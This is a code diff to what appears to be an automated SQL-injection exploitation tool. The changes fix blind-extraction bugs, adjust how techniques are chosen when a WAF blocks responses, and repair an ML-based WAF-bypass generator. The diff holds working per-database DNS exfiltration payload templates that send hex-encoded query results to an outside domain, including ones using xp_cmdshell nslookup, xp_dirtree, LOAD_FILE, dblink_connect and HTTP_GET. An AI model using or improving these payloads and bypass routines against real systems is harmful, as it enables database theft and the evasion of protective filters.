@@ -43360,7 +43360,7 @@ async def _extract_int(engine,config,queries,int_func,result,method,url,
                     # for large pages hits the asymptote), so the binary-search oracle's
                     # `sim > 0.75` threshold ALWAYS returned False → hi=mid on every
                     # iteration → converges to lo=0 → all extracted lengths/chars were 0.
-                    # FIXED: Changed _ei_fp_t.body to _ei_fp_t.body (correct variable name)
+                    # FIXED: Changed _ei_fptime.body to _ei_fp_t.body (correct variable name)
                     if _validate_response(_ei_fp_t, "response_body_check"):
                         _patched_baseline = dict(baseline)
                         _patched_baseline['mean_length'] = len(_extract_body_safe(_ei_fp_t))
@@ -43372,7 +43372,14 @@ async def _extract_int(engine,config,queries,int_func,result,method,url,
                                   'mean_length=%d true_sim=%.3f false_sim=%.3f',
                                   len(_extract_body_safe(_ei_fp_t)), _ei_sim_t, _ei_sim_f)
             except Exception as _ei_cal_err:
-                LOG.debug('[_extract_int] Self-calibration error: %s', _ei_cal_err)
+                # BUG-EXTRACT-INT-CALIBRATION-SILENT-FAIL FIX: Calibration failure was
+                # logged only at DEBUG (silent in normal operation). When the stub baseline
+                # from build_baseline() is active and calibration fails, every oracle eval
+                # returns False → lo stays at 0 → blind_extract_string returns "" with no
+                # visible indication. Promote to WARNING so the user can diagnose empty results.
+                LOG.warning('[_extract_int] Self-calibration failed — extraction may return '
+                            'empty strings if baseline is a stub (stub mean_length=0). '
+                            'Error: %s', _ei_cal_err)
 
         while lo<hi and iterations < max_iterations:
             iterations += 1
@@ -109491,7 +109498,12 @@ class TechniqueCascadeEngine:
                               " __VIEWSTATE MAC), NOT SQL injection", flush=True)
                         return False, "", "", ""
                 except Exception:
-                    pass  # canary failed to send: allow original 500 evidence
+                    # BUG-PCV-C-500-CANARY-EXCEPTION FIX: Swallowing any exception here
+                    # allows 500 evidence to be accepted without the control probe,
+                    # creating a false positive when the server returns sporadic 500s
+                    # and the canary send fails for any reason (network error, scan stop).
+                    # Correct behaviour: treat a failed canary as indeterminate and reject.
+                    return False, "", "", ""
                 print(f"[*]     Check C HTTP-500 fallback: {_status_500_count} error payloads → 500 "
                       f"(baseline={_bl_status}) — accepting as error signal (no DBMS text visible)"
                       " [canary=non-500, so 500 is SQL-selective]",
@@ -110092,7 +110104,12 @@ class TechniqueCascadeEngine:
                         "Oracle":     "' AND SUBSTR('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
                         "SQLite":     "' AND SUBSTR('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
                     }
-                return payloads.get(_dbms, payloads["MySQL"])
+                # BUG-CHECK-E-UNKNOWN-DBMS FIX: MySQL probe includes BENCHMARK() which
+                # is MySQL-specific; using it as the default causes a syntax error on
+                # Oracle/PostgreSQL/MSSQL/SQLite and yields unreliable similarity scores.
+                # PostgreSQL probe uses only ANSI-compatible functions (SUBSTRING, LENGTH,
+                # UPPER) and is a safe fallback for any unknown DBMS.
+                return payloads.get(_dbms, payloads["PostgreSQL"])
 
             # BUG-CHECK-E-LOGIC-FIX (Req 3): The original comparison used
             # |det_sim - e_sim| where both sims are AGAINST BASELINE.
@@ -112983,7 +113000,28 @@ class TechniqueCascadeEngine:
         _user_explicit = techniques_requested not in ("ALL", "all", "*", "")
 
         if _oracle_mode == OracleMode.BLOCKED:
-            LOG.info("  [try_all] Oracle=BLOCKED  testing ALL techniques (PCV filters false positives)")
+            # BUG-ORACLE-BLOCKED-NO-TECHNIQUE-FILTER FIX: Oracle=BLOCKED means every HTTP
+            # response is a static block page (clean ≡ injected), so boolean and error-based
+            # techniques cannot produce signal.  The detection phase warning says "timing
+            # techniques only", but try_all() was running ALL techniques, contradicting that
+            # intent.  Timing techniques (T/S/HQ/TH/BT) work because SLEEP fires before the
+            # WAF rejects the request; OOB techniques (O/DS) bypass the HTTP channel entirely.
+            # Restrict to these two groups.  PCV guards filter false positives within the set.
+            _blocked_capable = {"T", "S", "HQ", "TH", "BT", "O", "DS"}
+            if not _user_explicit:
+                orig_req = techniques_requested
+                techniques_requested = ",".join(_blocked_capable)
+                LOG.info("  [try_all] Oracle=BLOCKED  restricting to timing+OOB techniques: "
+                         f"{techniques_requested} (was {orig_req})")
+            else:
+                _user_techs = set(t.strip() for t in techniques_requested.split(",") if t.strip())
+                _viable = _user_techs & _blocked_capable
+                if _viable:
+                    techniques_requested = ",".join(_viable)
+                    LOG.info(f"  [try_all] Oracle=BLOCKED  honoring user: {techniques_requested}")
+                else:
+                    LOG.warning(f"  [try_all] Oracle=BLOCKED  user requested {techniques_requested}, "
+                                "honoring anyway (--technique overrides oracle).")
 
         if _oracle_mode == OracleMode.TIMING_ONLY:
             orig_req = techniques_requested
@@ -138003,7 +138041,11 @@ class SideChannelExtractor:
         # accumulate until max_len. Fix: space-streak counter (same as extract_from_table).
         _sce_we_space_streak = 0
         for pos in range(1, max_len + 1):
-            lo, hi = 32, _sce_we_char_hi  # BUG-LATIN1-126-FIX: extended from 126 to 255 for full Latin-1 range
+            # BUG-SCE-EXTWERR-LO-INIT-V2 FIX: lo=32 means EOS (ordinal=0) converges to 32
+            # (space) instead of 0, so the `lo < 32` EOS guard at line 138130 never fires.
+            # The space-streak counter catches it after 3 spurious spaces (~21 wasted requests).
+            # Fix: lo=0 lets EOS converge to 0 → `lo < 32` fires immediately on first EOS char.
+            lo, hi = 0, _sce_we_char_hi  # BUG-LATIN1-126-FIX: extended from 126 to 255 for full Latin-1 range
             # BUG-SCE-WE-UNDEF-CMP-TESTA FIX: `_cmp` and `test_a` were used below
             # but never defined anywhere in this function.  On every call to
             # extract_where_error() — for every DBMS, every strategy — the loop
@@ -138783,7 +138825,10 @@ class SideChannelExtractor:
                            else 255)
 
         for pos in range(1, max_len + 1):
-            lo, hi = 32, _sce_lc_char_hi  # BUG-V73 FIX: was hardcoded 255
+            # BUG-SCE-LC-LO-INIT-V2 FIX: lo=32 causes EOS to converge to space instead of 0;
+            # `lo < 32` guard never fires, wasting ~21 requests on spurious space chars.
+            # Same root cause and fix as extract_where_error (BUG-SCE-EXTWERR-LO-INIT-V2).
+            lo, hi = 0, _sce_lc_char_hi  # BUG-V73 FIX: was hardcoded 255
             # BUG-LC-STUCK-ORACLE FIX: binary search converges at lo == hi == _sce_lc_char_hi
             # when the timing oracle is stuck-True (all probes exceed threshold due to network
             # jitter or WAF interference). The guard `lo > _sce_lc_char_hi` uses strict >
@@ -139203,7 +139248,10 @@ class SideChannelExtractor:
                                "Amazon Redshift", "MySQL", "MariaDB", "TiDB")
                            else 255)
         for pos in range(1, max_len + 1):
-            lo, hi = 32, _sce_ew_char_hi  # BUG-V73-SCE-EXTRACTWITHEVAL-DBMS-CEIL FIX: was hardcoded 255
+            # BUG-SCE-EW-LO-INIT-V2 FIX: lo=32 causes EOS to converge to space instead of 0;
+            # `lo < 32` guard never fires, wasting ~21 requests on spurious space chars.
+            # Same root cause and fix as extract_where_error (BUG-SCE-EXTWERR-LO-INIT-V2).
+            lo, hi = 0, _sce_ew_char_hi  # BUG-V73-SCE-EXTRACTWITHEVAL-DBMS-CEIL FIX: was hardcoded 255
             # BUG-EW-STUCK-ORACLE FIX: Track whether any False result was ever seen during
             # this character's binary search. If lo converges above 127 without a single
             # False result, the eval_fn oracle is stuck-True (WAF blocks all conditions →
@@ -147220,18 +147268,27 @@ class ExtractionOrchestrator:
                                                 _inter.get("hostname") or
                                                 _inter.get("raw-request", "").split("\n")[0] or "")
                                     if _sub:
-                                        # Always use first label — chunk_id in
-                                        # "hex.0.domain" would corrupt regex match.
-                                        _hex_part = _sub.split(".")[0]
+                                        _parts = _sub.split(".")
+                                        _hex_part = _parts[0]
+                                        # BUG-DNS-EXFIL-CHUNK-ORDER FIX: chunk_id was
+                                        # ignored; out-of-order OAST delivery (common due
+                                        # to network jitter) produced scrambled strings.
+                                        # Store (chunk_id, decoded) tuples and sort before
+                                        # joining.  Single-chunk extractions (chunk_id=0)
+                                        # are unaffected.
+                                        try:
+                                            _cid = int(_parts[1]) if len(_parts) > 1 else 0
+                                        except (ValueError, IndexError):
+                                            _cid = 0
                                         if (len(_hex_part) >= 4 and all(
                                                 c in "0123456789abcdef"
                                                 for c in _hex_part.lower())):
                                             try:
-                                                _chunks.append(bytes.fromhex(_hex_part.lower()).decode("utf-8", errors="replace"))
+                                                _chunks.append((_cid, bytes.fromhex(_hex_part.lower()).decode("utf-8", errors="replace")))
                                             except (ValueError, UnicodeDecodeError):
-                                                _chunks.append(_hex_part)
+                                                _chunks.append((_cid, _hex_part))
                                 if _chunks:
-                                    _oob_result = "".join(_chunks)
+                                    _oob_result = "".join(ch for _, ch in sorted(_chunks))
                                     print(f"[+] DNS exfil data received: {_oob_result[:60]}", flush=True)
                                     return _oob_result
                         except Exception:
@@ -149945,13 +150002,20 @@ class DNSTunnelExtractor:
         "MySQL": "SELECT LOAD_FILE(CONCAT('\\\\\\\\',LOWER(HEX(({query}))),'.{chunk_id}.{domain}\\\\x'))",
         "MariaDB": "SELECT LOAD_FILE(CONCAT('\\\\\\\\',LOWER(HEX(({query}))),'.{chunk_id}.{domain}\\\\x'))",
         "MSSQL": "EXEC master..xp_dirtree '\\\\'+LOWER(CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),({query})),2))+'.{chunk_id}.{domain}\\x'",
-        "Sybase": "EXEC xp_cmdshell 'nslookup '+LOWER(CONVERT(VARCHAR(200),({query})))+'.{chunk_id}.{domain}'",
+        # BUG-DNS-EXFIL-SYBASE-HEX FIX: Raw VARCHAR in nslookup arg breaks on
+        # spaces/special chars and fails the hex-only DNS label validator.
+        # Use the same VARBINARY→hex CONVERT approach as MSSQL (Sybase ancestor).
+        "Sybase": "EXEC xp_cmdshell 'nslookup '+LOWER(CONVERT(VARCHAR(255),CONVERT(VARBINARY,({query})),2))+'.{chunk_id}.{domain}'",
         "PostgreSQL": "SELECT dblink_connect($$host=$$||encode(({query})::bytea,$$hex$$)||$$.{chunk_id}.{domain} dbname=x connect_timeout=2$$)",
         "CockroachDB": "SELECT dblink_connect($$host=$$||encode(({query})::bytea,$$hex$$)||$$.{chunk_id}.{domain} dbname=x connect_timeout=2$$)",
         "Oracle": "SELECT UTL_INADDR.GET_HOST_ADDRESS(LOWER(RAWTOHEX(UTL_RAW.CAST_TO_RAW(({query}))))||'.{chunk_id}.{domain}') FROM DUAL",
         "DB2": "SELECT XMLPARSE(DOCUMENT HTTPGETCLOB('http://'||LOWER(HEX(CAST(({query}) AS VARCHAR(200))))||'.{chunk_id}.{domain}/','')) FROM SYSIBM.SYSDUMMY1",
         "H2": "SELECT * FROM CSVREAD('http://'||LOWER(RAWTOHEX(CAST(({query}) AS VARCHAR)))||'.{chunk_id}.{domain}/x.csv')",
-        "SAP_HANA": "SELECT HTTP_GET('http://'||LOWER(({query}))||'.{chunk_id}.{domain}/') FROM DUMMY",
+        # BUG-DNS-EXFIL-SAPHANA-HEX FIX: Raw query output in URL fails hex label
+        # validator (spaces/special chars). Use BINTOHEX(CAST(...AS VARBINARY)) to
+        # hex-encode first. HTTP_GET still triggers a DNS lookup for the hex hostname
+        # which OAST captures as a DNS interaction, so polling works correctly.
+        "SAP_HANA": "SELECT HTTP_GET('http://'||LOWER(BINTOHEX(CAST(({query}) AS VARBINARY)))||'.{chunk_id}.{domain}/') FROM DUMMY",
     }
 
     # Maximum chars per DNS label
@@ -168016,11 +168080,17 @@ class WAFMLBypassGenerator:
         try:
             fp = await _send_injected(self.engine, method, url, data, data_fmt,
                                       param, original + payload, tamper)
-            if fp and _validate_response(fp, allow_empty=True) and _get_safe_status_code(fp) in (403, 406, 429, 503):
+            # BUG-WAFML-IS-BLOCKED-STATUS FIX: 400 and 412 are in WAF_BLOCK_CODES
+            # but were missing from this local check; WAF returning 400 Bad Request
+            # on injected SQL was not detected as blocked → accepted as bypass.
+            if fp and _validate_response(fp, allow_empty=True) and _get_safe_status_code(fp) in (400, 403, 406, 412, 429, 503):
                 return True
             body = _safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction").lower()
+            # BUG-WAF-3 propagation FIX: "security" was removed from WAFBlockDetector
+            # (too broad — matches login/password security pages) but was NOT removed here.
+            # Remove it to match WAFBlockDetector behaviour.
             return any(pat in body for pat in
-                       ("blocked", "forbidden", "access denied", "security",
+                       ("blocked", "forbidden", "access denied",
                         "rate limit", "cloudflare", "captcha"))
         except Exception:
             return False  # network error  blocked
@@ -168140,7 +168210,24 @@ class WAFMLBypassGenerator:
                 # No substitutions fired  skip to avoid returning the original
                 continue
 
-            if best_loss <= self.HTTP_CHECK_THRESHOLD:
+            # BUG-WAFML-THRESHOLD-REVERSED FIX: The original if/elif order was inverted.
+            # HTTP_CHECK_THRESHOLD (0.55) > TRIGRAM_ACCEPT_THRESHOLD (0.30), so
+            # `if best_loss <= HTTP_CHECK_THRESHOLD` captured ALL candidates including
+            # those ≤ 0.30, making the `elif best_loss <= TRIGRAM_ACCEPT_THRESHOLD`
+            # permanently unreachable dead code and always doing an HTTP check even for
+            # the highest-confidence (lowest-loss) bypass candidates.
+            # Correct order: check the tighter threshold first.
+            if best_loss <= self.TRIGRAM_ACCEPT_THRESHOLD:
+                # Very low score: accept without HTTP check (saves requests)
+                variants.append(best_cand)
+                self._scorer.train(best_cand)
+                LOG.debug(f"WAFMLBypass[SPSA k={k}]: trigram-only accept "
+                          f"score={best_loss:.3f} payload={best_cand[:60]!r}")
+                if len(variants) >= 5:
+                    break
+                seed_payload = best_cand
+                theta = [t * 0.7 for t in theta]  # partial reset
+            elif best_loss <= self.HTTP_CHECK_THRESHOLD:
                 # Low enough trigram score: worth an HTTP block-check
                 blocked = await self._is_blocked(method, url, data, data_fmt,
                                                   param, original, best_cand, tamper)
@@ -168155,14 +168242,6 @@ class WAFMLBypassGenerator:
                     # by re-seeding the model and resetting  toward current optimum
                     seed_payload = best_cand
                     theta = [t * 0.7 for t in theta]  # partial reset
-            elif best_loss <= self.TRIGRAM_ACCEPT_THRESHOLD:
-                # Very low score: accept without HTTP check (saves requests)
-                variants.append(best_cand)
-                self._scorer.train(best_cand)
-                LOG.debug(f"WAFMLBypass[SPSA k={k}]: trigram-only accept "
-                          f"score={best_loss:.3f} payload={best_cand[:60]!r}")
-                if len(variants) >= 5:
-                    break
 
         LOG.debug(f"WAFMLBypass: SPSA generated {len(variants)} bypass variants "
                   f"in {k} iterations")
